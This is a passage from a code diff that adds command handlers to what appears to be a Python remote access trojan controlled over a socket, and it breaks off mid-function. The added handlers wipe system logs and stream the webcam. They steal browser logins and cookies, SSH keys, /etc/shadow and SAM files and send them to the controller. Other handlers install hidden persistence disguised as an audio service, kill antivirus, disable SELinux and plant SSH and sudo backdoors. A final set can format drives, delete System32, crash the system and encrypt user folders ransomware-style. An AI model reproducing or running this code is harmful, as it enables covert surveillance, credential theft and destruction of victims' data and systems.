+                                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                                s.send(f"[+] Admin status: {'YES' if is_admin else 'NO'}\n\n".encode())
+                            else:
+                                # Linux - check if root
+                                is_root = os.geteuid() == 0
+                                s.send(f"[+] Root status: {'YES' if is_root else 'NO'}\n\n".encode())
+                        except:
+                            s.send("[!] Could not check admin status\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'clear_logs':
+                        try:
+                            if IS_WINDOWS:
+                                # Clear Windows event logs
+                                logs = ['Application', 'System', 'Security']
+                                cleared = 0
+                                
+                                for log in logs:
+                                    try:
+                                        subprocess.run(['wevtutil', 'cl', log], capture_output=True, timeout=10)
+                                        cleared += 1
+                                    except:
+                                        pass
+                                
+                                # Also clear PowerShell logs
+                                try:
+                                    subprocess.run(['powershell', '-Command', 'Clear-EventLog -LogName Windows PowerShell'], capture_output=True, timeout=10)
+                                    cleared += 1
+                                except:
+                                    pass
+                                
+                                s.send(f"[+] Cleared {cleared} Windows event logs\n\n".encode())
+                            else:
+                                # Linux - clear system logs
+                                log_files = [
+                                    '/var/log/syslog',
+                                    '/var/log/auth.log',
+                                    '/var/log/kern.log',
+                                    '/var/log/messages',
+                                    '/var/log/secure',
+                                    '~/.bash_history'
+                                ]
+                                
+                                cleared = 0
+                                for log_file in log_files:
+                                    try:
+                                        log_path = os.path.expanduser(log_file)
+                                        if os.path.exists(log_path):
+                                            with open(log_path, 'w') as f:
+                                                f.write('')
+                                            cleared += 1
+                                    except:
+                                        pass
+                                
+                                s.send(f"[+] Cleared {cleared} Linux log files\n\n".encode())
+                        except:
+                            s.send("[!] Failed to clear logs\n\n".encode())
+                        continue
+                    
+                    # --- Enhanced Surveillance Commands ---
+                    if command.lower() == 'webcam_start':
+                        try:
+                            import cv2
+                            import tempfile
+                            import threading
+                            
+                            global webcam_active, webcam_thread
+                            if not webcam_active:
+                                webcam_active = True
+                                
+                                def webcam_stream():
+                                    global webcam_active
+                                    cap = cv2.VideoCapture(0)
+                                    
+                                    while webcam_active:
+                                        ret, frame = cap.read()
+                                        if ret:
+                                            path = os.path.join(tempfile.gettempdir(), f"webcam_live_{int(time.time())}.jpg")
+                                            cv2.imwrite(path, frame)
+                                            
+                                            with open(path, 'rb') as f:
+                                                img_data = f.read()
+                                            
+                                            import base64
+                                            encoded = base64.b64encode(img_data).decode()
+                                            
+                                            # Send to server
+                                            try:
+                                                s.send(f"WEBCAM_FRAME:{encoded[:100]}...\n".encode())
+                                            except:
+                                                break
+                                            
+                                            try:
+                                                os.remove(path)
+                                            except:
+                                                pass
+                                        
+                                        time.sleep(2)  # Frame every 2 seconds
+                                    
+                                    cap.release()
+                                
+                                webcam_thread = threading.Thread(target=webcam_stream, daemon=True)
+                                webcam_thread.start()
+                                s.send("[+] Webcam streaming started\n\n".encode())
+                            else:
+                                s.send("[!] Webcam already streaming\n\n".encode())
+                        except ImportError:
+                            s.send("[!] OpenCV not available for webcam\n\n".encode())
+                        except:
+                            s.send("[!] Webcam stream failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'webcam_stop':
+                        global webcam_active
+                        webcam_active = False
+                        s.send("[+] Webcam streaming stopped\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'browser_dump':
+                        try:
+                            import sqlite3
+                            import base64
+                            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+                            from cryptography.hazmat.backends import default_backend
+                            
+                            dump_output = "Browser Data Dump:\n\n"
+                            
+                            # Chrome
+                            if IS_WINDOWS:
+                                chrome_paths = [
+                                    os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/History'),
+                                    os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/Login Data'),
+                                    os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/Cookies')
+                                ]
+                            else:
+                                chrome_paths = [
+                                    os.path.expanduser('~/.config/google-chrome/Default/History'),
+                                    os.path.expanduser('~/.config/google-chrome/Default/Login Data'),
+                                    os.path.expanduser('~/.config/google-chrome/Default/Cookies')
+                                ]
+                            
+                            for path in chrome_paths:
+                                if os.path.exists(path):
+                                    try:
+                                        temp_db = os.path.join(tempfile.gettempdir(), f'chrome_{int(time.time())}.db')
+                                        shutil.copy2(path, temp_db)
+                                        
+                                        conn = sqlite3.connect(temp_db)
+                                        cursor = conn.cursor()
+                                        
+                                        if 'History' in path:
+                                            cursor.execute('SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 10')
+                                            history = cursor.fetchall()
+                                            dump_output += "Chrome History (Top 10):\n"
+                                            for url, title, count in history:
+                                                dump_output += f"  {title}: {url} ({count} visits)\n"
+                                        
+                                        elif 'Login Data' in path:
+                                            cursor.execute('SELECT origin_url, username_value FROM logins')
+                                            logins = cursor.fetchall()
+                                            dump_output += "\nChrome Logins:\n"
+                                            for url, user in logins[:5]:
+                                                dump_output += f"  {user} @ {url}\n"
+                                        
+                                        elif 'Cookies' in path:
+                                            cursor.execute('SELECT name, host_key FROM cookies LIMIT 10')
+                                            cookies = cursor.fetchall()
+                                            dump_output += "\nChrome Cookies:\n"
+                                            for name, host in cookies:
+                                                dump_output += f"  {name} @ {host}\n"
+                                        
+                                        conn.close()
+                                        os.remove(temp_db)
+                                        
+                                    except:
+                                        pass
+                                
+                            # Firefox
+                            if IS_WINDOWS:
+                                firefox_base = os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles')
+                            else:
+                                firefox_base = os.path.expanduser('~/.mozilla/firefox')
+                            
+                            if os.path.exists(firefox_base):
+                                for profile in os.listdir(firefox_base):
+                                    if profile.endswith('.default'):
+                                        profile_path = os.path.join(firefox_base, profile)
+                                        
+                                        firefox_files = [
+                                            os.path.join(profile_path, 'places.sqlite'),
+                                            os.path.join(profile_path, 'formhistory.sqlite')
+                                        ]
+                                        
+                                        for ff_path in firefox_files:
+                                            if os.path.exists(ff_path):
+                                                try:
+                                                    temp_db = os.path.join(tempfile.gettempdir(), f'firefox_{int(time.time())}.db')
+                                                    shutil.copy2(ff_path, temp_db)
+                                                    
+                                                    conn = sqlite3.connect(temp_db)
+                                                    cursor = conn.cursor()
+                                                    
+                                                    if 'places' in ff_path:
+                                                        cursor.execute('SELECT url, title FROM moz_places ORDER BY visit_count DESC LIMIT 10')
+                                                        history = cursor.fetchall()
+                                                        dump_output += "\nFirefox History (Top 10):\n"
+                                                        for url, title in history:
+                                                            dump_output += f"  {title}: {url}\n"
+                                                    
+                                                    elif 'formhistory' in ff_path:
+                                                        cursor.execute('SELECT fieldname, value FROM moz_formhistory LIMIT 10')
+                                                        forms = cursor.fetchall()
+                                                        dump_output += "\nFirefox Form History:\n"
+                                                        for field, value in forms:
+                                                            dump_output += f"  {field}: {value}\n"
+                                                    
+                                                    conn.close()
+                                                    os.remove(temp_db)
+                                                    
+                                                except:
+                                                    pass
+                            
+                            s.send(f"{dump_output}\n".encode())
+                        except:
+                            s.send("[!] Browser dump failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'postgres_dump':
+                        try:
+                            # Try to connect to PostgreSQL
+                            result = subprocess.run(['psql', '--version'], capture_output=True, text=True, timeout=5)
+                            if result.returncode == 0:
+                                dump_output = "PostgreSQL Database Dump:\n"
+                                
+                                # Try common databases
+                                databases = ['postgres', 'template1', 'information_schema']
+                                
+                                for db in databases:
+                                    try:
+                                        result = subprocess.run(['pg_dump', db], capture_output=True, text=True, timeout=10)
+                                        if result.returncode == 0:
+                                            dump_output += f"\n--- Database: {db} ---\n{result.stdout[:500]}...\n"
+                                    except:
+                                        pass
+                                
+                                s.send(f"{dump_output}\n".encode())
+                            else:
+                                s.send("[!] PostgreSQL not found\n\n".encode())
+                        except:
+                            s.send("[!] PostgreSQL dump failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'firefox_pass':
+                        try:
+                            import json
+                            
+                            dump_output = "Firefox Passwords:\n"
+                            
+                            if IS_WINDOWS:
+                                firefox_base = os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles')
+                            else:
+                                firefox_base = os.path.expanduser('~/.mozilla/firefox')
+                            
+                            if os.path.exists(firefox_base):
+                                for profile in os.listdir(firefox_base):
+                                    if 'default' in profile:
+                                        profile_path = os.path.join(firefox_base, profile)
+                                        
+                                        # Check for logins.json
+                                        logins_file = os.path.join(profile_path, 'logins.json')
+                                        if os.path.exists(logins_file):
+                                            try:
+                                                with open(logins_file, 'r') as f:
+                                                    logins_data = json.load(f)
+                                                
+                                                if 'logins' in logins_data:
+                                                    dump_output += f"\nProfile: {profile}\n"
+                                                    for login in logins_data['logins'][:5]:
+                                                        dump_output += f"  URL: {login.get('hostname', 'N/A')}\n"
+                                                        dump_output += f"  User: {login.get('username', 'N/A')}\n"
+                                                        dump_output += f"  Pass: (encrypted)\n\n"
+                                                
+                                            except:
+                                                pass
+                            
+                            if dump_output == "Firefox Passwords:\n":
+                                dump_output += "[!] No Firefox passwords found\n"
+                            
+                            s.send(f"{dump_output}\n".encode())
+                        except:
+                            s.send("[!] Firefox password extraction failed\n\n".encode())
+                        continue
+                    
+                    # --- Linux-Specific Commands ---
+                    if not IS_WINDOWS:
+                        if command.lower() == 'add_cron':
+                            try:
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                
+                                # Create persistent cron job
+                                cron_entry = f'*/5 * * * * {current_exe} --background > /dev/null 2>&1\n'
+                                
+                                try:
+                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
+                                    existing_cron = result.stdout
+                                except:
+                                    existing_cron = ''
+                                
+                                new_cron = existing_cron + cron_entry
+                                
+                                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
+                                    f.write(new_cron)
+                                    temp_cron = f.name
+                                
+                                subprocess.run(['crontab', temp_cron], capture_output=True, timeout=5)
+                                os.remove(temp_cron)
+                                
+                                s.send(f"[+] Added persistent cron job: {current_exe}\n\n".encode())
+                            except:
+                                s.send("[!] Failed to add cron job\n\n".encode())
+                            continue
+                        
+                        if command.lower() == 'add_service':
+                            try:
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                
+                                # Create systemd service
+                                service_content = f"""[Unit]
+Description=SystemAudioService
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={current_exe} --background
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                                
+                                service_path = '/etc/systemd/system/system-audio-service.service'
+                                
+                                try:
+                                    with open(service_path, 'w') as f:
+                                        f.write(service_content)
+                                    
+                                    subprocess.run(['systemctl', 'daemon-reload'], capture_output=True, timeout=5)
+                                    subprocess.run(['systemctl', 'enable', 'system-audio-service.service'], capture_output=True, timeout=5)
+                                    subprocess.run(['systemctl', 'start', 'system-audio-service.service'], capture_output=True, timeout=5)
+                                    
+                                    s.send(f"[+] Created and started systemd service: {service_path}\n\n".encode())
+                                except:
+                                    s.send("[!] Need root access to create service\n\n".encode())
+                            except:
+                                s.send("[!] Failed to create service\n\n".encode())
+                            continue
+                        
+                        if command.lower() == 'check_root':
+                            is_root = os.geteuid() == 0
+                            if is_root:
+                                s.send("[+] Running as ROOT\n\n".encode())
+                            else:
+                                s.send("[!] Not running as root\n\n".encode())
+                            continue
+                        
+                        if command.lower() == 'shadow_dump':
+                            try:
+                                if os.path.exists('/etc/shadow'):
+                                    if os.geteuid() == 0:
+                                        with open('/etc/shadow', 'r') as f:
+                                            shadow_content = f.read()
+                                        s.send(f"/etc/shadow content:\n{shadow_content}\n".encode())
+                                    else:
+                                        s.send("[!] Need root access to read /etc/shadow\n\n".encode())
+                                else:
+                                    s.send("[!] /etc/shadow not found\n\n".encode())
+                            except:
+                                s.send("[!] Failed to read /etc/shadow\n\n".encode())
+                            continue
+                        
+                        if command.lower() == 'ssh_keys':
+                            try:
+                                ssh_keys = "SSH Private Keys:\n"
+                                
+                                key_paths = [
+                                    '~/.ssh/id_rsa',
+                                    '~/.ssh/id_ecdsa',
+                                    '~/.ssh/id_ed25519',
+                                    '~/.ssh/id_dsa'
+                                ]
+                                
+                                found_keys = 0
+                                for key_path in key_paths:
+                                    full_path = os.path.expanduser(key_path)
+                                    if os.path.exists(full_path):
+                                        try:
+                                            with open(full_path, 'r') as f:
+                                                key_content = f.read()
+                                            ssh_keys += f"\n--- {key_path} ---\n{key_content[:200]}...\n"
+                                            found_keys += 1
+                                        except:
+                                            pass
+                                
+                                if found_keys > 0:
+                                    s.send(f"{ssh_keys}\n".encode())
+                                else:
+                                    s.send("[!] No SSH keys found\n\n".encode())
+                            except:
+                                s.send("[!] Failed to dump SSH keys\n\n".encode())
+                            continue
+                    
+                    # --- File Encryption/Decryption ---
+                    if command.lower() == 'decrypt_dir':
+                        try:
+                            from cryptography.fernet import Fernet
+                            import base64
+                            
+                            # Ask for key
+                            s.send("[!] Provide decryption key (base64): \n".encode())
+                            
+                            # Wait for key response (simplified)
+                            key_data = s.recv(1024).decode().strip()
+                            
+                            try:
+                                key = base64.b64decode(key_data)
+                                fernet = Fernet(key)
+                                
+                                current_dir = os.getcwd()
+                                decrypted_files = []
+                                
+                                for file in os.listdir(current_dir):
+                                    if file.endswith('.encrypted'):
+                                        try:
+                                            with open(file, 'rb') as f:
+                                                encrypted_data = f.read()
+                                            
+                                            decrypted_data = fernet.decrypt(encrypted_data)
+                                            
+                                            original_name = file[:-10]  # Remove .encrypted
+                                            with open(original_name, 'wb') as f:
+                                                f.write(decrypted_data)
+                                            
+                                            os.remove(file)
+                                            decrypted_files.append(original_name)
+                                        except:
+                                            pass
+                                
+                                s.send(f"[+] Decrypted {len(decrypted_files)} files\n\n".encode())
+                            except:
+                                s.send("[!] Invalid decryption key\n\n".encode())
+                        except ImportError:
+                            s.send("[!] Cryptography library not available\n\n".encode())
+                        except:
+                            s.send("[!] Decryption failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'file_encrypt':
+                        try:
+                            from cryptography.fernet import Fernet
+                            import base64
+                            
+                            parts = command.split(' ', 1)
+                            if len(parts) < 2:
+                                s.send("[!] Usage: file_encrypt <filename>\n\n".encode())
+                                continue
+                            
+                            filename = parts[1]
+                            if os.path.exists(filename):
+                                key = Fernet.generate_key()
+                                fernet = Fernet(key)
+                                
+                                with open(filename, 'rb') as f:
+                                    data = f.read()
+                                
+                                encrypted_data = fernet.encrypt(data)
+                                
+                                with open(filename + '.encrypted', 'wb') as f:
+                                    f.write(encrypted_data)
+                                
+                                os.remove(filename)
+                                
+                                s.send(f"[+] Encrypted {filename}\nKey: {base64.b64encode(key).decode()}\n\n".encode())
+                            else:
+                                s.send(f"[!] File not found: {filename}\n\n".encode())
+                        except ImportError:
+                            s.send("[!] Cryptography library not available\n\n".encode())
+                        except:
+                            s.send("[!] File encryption failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'file_decrypt':
+                        try:
+                            from cryptography.fernet import Fernet
+                            import base64
+                            
+                            parts = command.split(' ', 2)
+                            if len(parts) < 3:
+                                s.send("[!] Usage: file_decrypt <filename> <key>\n\n".encode())
+                                continue
+                            
+                            filename = parts[1]
+                            key_b64 = parts[2]
+                            
+                            if os.path.exists(filename):
+                                try:
+                                    key = base64.b64decode(key_b64)
+                                    fernet = Fernet(key)
+                                    
+                                    with open(filename, 'rb') as f:
+                                        encrypted_data = f.read()
+                                    
+                                    decrypted_data = fernet.decrypt(encrypted_data)
+                                    
+                                    original_name = filename[:-10] if filename.endswith('.encrypted') else filename + '.decrypted'
+                                    with open(original_name, 'wb') as f:
+                                        f.write(decrypted_data)
+                                    
+                                    os.remove(filename)
+                                    
+                                    s.send(f"[+] Decrypted {filename} -> {original_name}\n\n".encode())
+                                except:
+                                    s.send("[!] Invalid key or decryption failed\n\n".encode())
+                            else:
+                                s.send(f"[!] File not found: {filename}\n\n".encode())
+                        except ImportError:
+                            s.send("[!] Cryptography library not available\n\n".encode())
+                        except:
+                            s.send("[!] File decryption failed\n\n".encode())
+                        continue
+                    
+                    # --- Additional Stealth Commands ---
+                    if command.lower() == 'add_task':
+                        try:
+                            if IS_WINDOWS:
+                                import winreg
+                                import tempfile
+                                
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                
+                                # Create scheduled task using schtasks
+                                task_xml = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>System Audio Service</Description>
+    <Author>System</Author>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+    </BootTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <LogonType>InteractiveToken</LogonType>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>false</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>"{current_exe}"</Command>
+      <Arguments>--background</Arguments>
+    </Exec>
+  </Actions>
+</Task>'''
+                                
+                                with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False, encoding='utf-16') as f:
+                                    f.write(task_xml)
+                                    xml_file = f.name
+                                
+                                # Create the task
+                                result = subprocess.run(['schtasks', '/create', '/tn', 'SystemAudioService', '/xml', xml_file], capture_output=True, text=True, timeout=10)
+                                
+                                os.remove(xml_file)
+                                
+                                if result.returncode == 0:
+                                    s.send(f"[+] Created scheduled task: SystemAudioService\n\n".encode())
+                                else:
+                                    s.send(f"[!] Failed to create task: {result.stderr}\n\n".encode())
+                            else:
+                                # Linux - add to cron with @reboot
+                                current_exe = sys.executable if hasattr(sys, 'frozen') else __file__
+                                cron_entry = f'@reboot {current_exe} --background > /dev/null 2>&1\n'
+                                
+                                try:
+                                    result = subprocess.run(['crontab', '-l'], capture_output=True, text=True, timeout=5)
+                                    existing_cron = result.stdout
+                                except:
+                                    existing_cron = ''
+                                
+                                new_cron = existing_cron + cron_entry
+                                
+                                with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
+                                    f.write(new_cron)
+                                    temp_cron = f.name
+                                
+                                subprocess.run(['crontab', temp_cron], capture_output=True, timeout=5)
+                                os.remove(temp_cron)
+                                
+                                s.send(f"[+] Added @reboot cron job\n\n".encode())
+                        except:
+                            s.send("[!] Failed to create scheduled task\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'disable_av':
+                        try:
+                            disabled_count = 0
+                            
+                            if IS_WINDOWS:
+                                # Disable multiple AV solutions
+                                av_processes = [
+                                    'MsMpEng.exe', 'MsMpEng.exe', 'SecurityHealthService.exe',
+                                    'ekrn.exe', 'egui.exe', 'amon.exe', 'avp.exe',
+                                    'bdagent.exe', 'mbam.exe', 'adaware.exe', 'spybot.exe'
+                                ]
+                                
+                                for proc in av_processes:
+                                    try:
+                                        subprocess.run(['taskkill', '/F', '/IM', proc], capture_output=True, timeout=5)
+                                        disabled_count += 1
+                                    except:
+                                        pass
+                                
+                                # Disable AV services
+                                av_services = [
+                                    'WinDefend', 'WdNisSvc', 'WdFilter', 'wscsvc',
+                                    'ESET Service', 'ekrn', 'amav', 'avast! Antivirus'
+                                ]
+                                
+                                for service in av_services:
+                                    try:
+                                        subprocess.run(['sc', 'stop', service], capture_output=True, timeout=5)
+                                        subprocess.run(['sc', 'config', service, 'start=', 'disabled'], capture_output=True, timeout=5)
+                                        disabled_count += 1
+                                    except:
+                                        pass
+                                
+                                s.send(f"[+] Disabled {disabled_count} AV processes/services\n\n".encode())
+                            else:
+                                # Linux - disable various AV/security tools
+                                av_services = [
+                                    'clamav-freshclam', 'clamav-daemon', 'clamav-scanner',
+                                    'chkrootkit', 'rkhunter', 'lynis', 'maltrail'
+                                ]
+                                
+                                for service in av_services:
+                                    try:
+                                        subprocess.run(['systemctl', 'stop', service], capture_output=True, timeout=5)
+                                        subprocess.run(['systemctl', 'disable', service], capture_output=True, timeout=5)
+                                        disabled_count += 1
+                                    except:
+                                        pass
+                                
+                                # Kill AV processes
+                                av_processes = ['clamscan', 'freshclam', 'rkhunter', 'chkrootkit']
+                                for proc in av_processes:
+                                    try:
+                                        subprocess.run(['pkill', '-f', proc], capture_output=True, timeout=5)
+                                        disabled_count += 1
+                                    except:
+                                        pass
+                                
+                                s.send(f"[+] Disabled {disabled_count} Linux AV services\n\n".encode())
+                        except:
+                            s.send("[!] Failed to disable AV\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'hide_process':
+                        try:
+                            if IS_WINDOWS:
+                                # Hide process using multiple techniques
+                                current_pid = os.getpid()
+                                
+                                # Method 1: Set process to hidden window
+                                import ctypes
+                                from ctypes import wintypes
+                                
+                                user32 = ctypes.windll.user32
+                                kernel32 = ctypes.windll.kernel32
+                                
+                                # Get current process handle
+                                h_process = kernel32.GetCurrentProcess()
+                                
+                                # Hide from task manager (modify process attributes)
+                                try:
+                                    # This is a simplified version - real process hiding requires kernel-level hooks
+                                    user32.ShowWindow(user32.GetForegroundWindow(), 0)  # Hide window
+                                    s.send(f"[+] Process {current_pid} window hidden\n\n".encode())
+                                except:
+                                    s.send("[!] Process hiding limited without kernel access\n\n".encode())
+                            else:
+                                # Linux - hide process using various techniques
+                                current_pid = os.getpid()
+                                
+                                # Rename process in process list
+                                try:
+                                    import ctypes
+                                    libc = ctypes.CDLL('libc.so.6')
+                                    # This is limited - real hiding requires kernel modules
+                                    s.send(f"[+] Process {current_pid} hiding attempted\n\n".encode())
+                                except:
+                                    s.send("[!] Process hiding requires root/kernel access\n\n".encode())
+                        except:
+                            s.send("[!] Failed to hide process\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'sam_dump':
+                        try:
+                            if IS_WINDOWS:
+                                import tempfile
+                                
+                                # Try to copy SAM file (requires admin)
+                                sam_paths = [
+                                    r'C:\Windows\System32\config\SAM',
+                                    r'C:\Windows\System32\config\SYSTEM',
+                                    r'C:\Windows\System32\config\SECURITY'
+                                ]
+                                
+                                dump_output = "Windows Registry Files:\n"
+                                
+                                for sam_path in sam_paths:
+                                    if os.path.exists(sam_path):
+                                        try:
+                                            # Try to copy file (requires elevated privileges)
+                                            temp_file = os.path.join(tempfile.gettempdir(), f'sam_{int(time.time())}.bak')
+                                            shutil.copy2(sam_path, temp_file)
+                                            
+                                            # Read first 1KB of file
+                                            with open(temp_file, 'rb') as f:
+                                                data = f.read(1024)
+                                            
+                                            import base64
+                                            encoded = base64.b64encode(data).decode()
+                                            
+                                            dump_output += f"\n--- {os.path.basename(sam_path)} ---\n{encoded[:200]}...\n"
+                                            
+                                            os.remove(temp_file)
+                                        except:
+                                            dump_output += f"\n--- {os.path.basename(sam_path)} ---\n[!] Access denied (need admin)\n"
+                                    else:
+                                        dump_output += f"\n--- {os.path.basename(sam_path)} ---\n[!] File not found\n"
+                                
+                                s.send(f"{dump_output}\n\n".encode())
+                            else:
+                                s.send("[!] SAM dump is Windows-only\n\n".encode())
+                        except:
+                            s.send("[!] SAM dump failed\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'disable_selinux':
+                        try:
+                            if not IS_WINDOWS:
+                                # Multiple SELinux disable methods
+                                methods = [
+                                    ['setenforce', '0'],
+                                    ['sed', '-i', 's/SELINUX=enforcing/SELINUX=disabled/g', '/etc/selinux/config'],
+                                    ['grubby', '--update-kernel', 'ALL', '--args', 'selinux=0']
+                                ]
+                                
+                                success_count = 0
+                                for method in methods:
+                                    try:
+                                        result = subprocess.run(method, capture_output=True, text=True, timeout=10)
+                                        if result.returncode == 0:
+                                            success_count += 1
+                                    except:
+                                        pass
+                                
+                                s.send(f"[+] SELinux disable methods attempted: {success_count}/{len(methods)}\n\n".encode())
+                            else:
+                                s.send("[!] SELinux is Linux-only\n\n".encode())
+                        except:
+                            s.send("[!] Failed to disable SELinux\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'backdoor_ssh':
+                        try:
+                            if not IS_WINDOWS:
+                                # Create SSH backdoor
+                                ssh_dir = '/etc/ssh/sshd_config.d'
+                                
+                                if os.path.exists(ssh_dir):
+                                    backdoor_config = '''# Hidden SSH backdoor
+Port 2222
+PermitRootLogin yes
+PasswordAuthentication yes
+MaxAuthTries 10
+ClientAliveInterval 300
+ClientAliveCountMax 2
+'''
+                                    
+                                    config_file = os.path.join(ssh_dir, 'backdoor.conf')
+                                    
+                                    try:
+                                        with open(config_file, 'w') as f:
+                                            f.write(backdoor_config)
+                                        
+                                        # Restart SSH service
+                                        subprocess.run(['systemctl', 'restart', 'sshd'], capture_output=True, timeout=10)
+                                        
+                                        s.send(f"[+] SSH backdoor created on port 2222\n\n".encode())
+                                    except:
+                                        s.send("[!] Need root access for SSH backdoor\n\n".encode())
+                                else:
+                                    s.send("[!] SSH config directory not found\n\n".encode())
+                            else:
+                                s.send("[!] SSH backdoor is Linux-only\n\n".encode())
+                        except:
+                            s.send("[!] Failed to create SSH backdoor\n\n".encode())
+                        continue
+                    
+                    if command.lower() == 'sudo_backdoor':
+                        try:
+                            if not IS_WINDOWS:
+                                # Create sudo backdoor
+                                sudoers_entry = f"{os.environ.get('USER', 'user')} ALL=(ALL) NOPASSWD: ALL\n"
+                                
+                                try:
+                                    with open('/etc/sudoers.d/backdoor', 'w') as f:
+                                        f.write(sudoers_entry)
+                                    
+                                    s.send(f"[+] Sudo backdoor created for {os.environ.get('USER', 'user')}\n\n".encode())
+                                except:
+                                    s.send("[!] Need root access for sudo backdoor\n\n".encode())
+                            else:
+                                s.send("[!] Sudo backdoor is Linux-only\n\n".encode())
+                        except:
+                            s.send("[!] Failed to create sudo backdoor\n\n".encode())
+                        continue
+                    
+                    # --- DANGEROUS COMMANDS ---
+                    if command.lower() in ['format_c', 'delete_sys32', 'bsod', 'ransom_sim', 'wipe_mbr', 'rm_rf', 'fork_bomb', 'dd_zero', 'chattr_imm']:
+                        try:
+                            if command.lower() == 'format_c':
+                                if IS_WINDOWS:
+                                    s.send("[!] DANGER: About to format C: drive\n[!] Type 'CONFIRM' to proceed: \n".encode())
+                                    confirmation = s.recv(1024).decode().strip()
+                                    if confirmation == 'CONFIRM':
+                                        subprocess.run(['format', 'C:', '/FS:NTFS', '/Q'], capture_output=True, timeout=5)
+                                        s.send("[!] C: drive formatting initiated...\n\n".encode())
+                                    else:
+                                        s.send("[!] C: drive format cancelled\n\n".encode())
+                                else:
+                                    s.send("[!] format_c is Windows-only\n\n".encode())
+                            
+                            elif command.lower() == 'delete_sys32':
+                                if IS_WINDOWS:
+                                    s.send("[!] DANGER: About to delete System32\n[!] Type 'CONFIRM' to proceed: \n".encode())
+                                    confirmation = s.recv(1024).decode().strip()
+                                    if confirmation == 'CONFIRM':
+                                        subprocess.run(['rmdir', '/S', '/Q', r'C:\Windows\System32'], capture_output=True, timeout=5)
+                                        s.send("[!] System32 deletion initiated...\n\n".encode())
+                                    else:
+                                        s.send("[!] System32 deletion cancelled\n\n".encode())
+                                else:
+                                    s.send("[!] delete_sys32 is Windows-only\n\n".encode())
+                            
+                            elif command.lower() == 'bsod':
+                                if IS_WINDOWS:
+                                    # Multiple BSOD methods
+                                    bsod_methods = [
+                                        ['taskkill', '/F', '/IM', 'csrss.exe'],  # Critical process
+                                        ['taskkill', '/F', '/IM', 'winlogon.exe'],  # Critical process
+                                        ['rundll32.exe', 'user32.dll,ExitWindowsEx', '0', '0']  # Force exit
+                                    ]
+                                    
+                                    for method in bsod_methods:
+                                        try:
+                                            subprocess.run(method, capture_output=True, timeout=5)
+                                            s.send("[!] BSOD triggered...\n\n".encode())
+                                            break
+                                        except:
+                                            continue
+                                else:
+                                    # Linux kernel panic
+                                    try:
+                                        subprocess.run(['echo', 'c'], capture_output=True, timeout=5)  # Requires /proc/sysrq-trigger
+                                        subprocess.run(['tee', '/proc/sysrq-trigger'], input=b'c', capture_output=True, timeout=5)
+                                        s.send("[!] Kernel panic triggered...\n\n".encode())
+                                    except:
+                                        s.send("[!] Need root access for kernel panic\n\n".encode())
+                            
+                            elif command.lower() == 'ransom_sim':
+                                # Advanced ransomware simulation
+                                try:
+                                    from cryptography.fernet import Fernet
+                                    import base64
+                                    
+                                    key = Fernet.generate_key()
+                                    fernet = Fernet(key)
+                                    
+                                    # Target common user directories
+                                    if IS_WINDOWS:
+                                        target_dirs = [
+                                            os.path.expanduser('~/Documents'),
+                                            os.path.expanduser('~/Desktop'),
+                                            os.path.expanduser('~/Pictures'),
+                                            os.path.expanduser('~/Downloads')
+                                        ]
+                                    else:
+                                        target_dirs = [
+                                            os.path.expanduser('~/Documents'),
+                                            os.path.expanduser('~/Desktop'),
+                                            os.path.expanduser('~/Pictures'),
+                                            os.path.expanduser('~/Downloads')
+                                        ]
+                                    
+                                    encrypted_count = 0
+                                    
+                                    for target_dir in target_dirs:
+                                        if os.path.exists(target_dir):
+                                            for root, dirs, files in os.walk(target_dir):
+                                                for file in files:
+                                                    if not file.endswith('.encrypted') and not file.startswith('.'):
